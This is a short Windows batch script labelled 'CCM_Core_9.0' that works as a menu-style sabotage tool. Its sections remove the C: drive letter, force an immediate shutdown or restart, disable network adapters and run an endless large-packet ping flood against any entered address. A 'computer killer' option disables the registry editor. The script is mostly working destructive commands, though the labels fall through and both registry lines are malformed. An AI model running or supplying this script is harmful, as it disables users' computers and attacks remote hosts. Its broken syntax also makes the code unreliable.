::CCM_Core_9.0
:CCMC1
cls
mountvol c:\ /d
pause
:CCMC2
cls
shutdown -s -t 1
pause
:CCMC3
cls
shutdown -r -t 1
pause
:CCMC4
cls
netsh interface set interface "以太网" disabled
netsh interface set interface "网络" disabled
netsh interface set interface "WLAN" disabled
netsh interface set interface "WIFI" disabled
pause
:CCMC5
cls
set /p q=输入ip或网址:
:dddstart
cls
ping %q% -t -l 65500
:CCMC6
exit
:CCMC7
cls
echo 1.性能检测版 2.电脑杀手 
set /p asdsdsdsd=请选择 
if /i '%asdsdsdsd%'=='1' goto CCMC8
if /i '%asdsdsdsd%'=='2' goto CCMC9
:CCMC8
resmon
:CCMC9
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 00000001 /
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools/tREG_DWORD/d1/f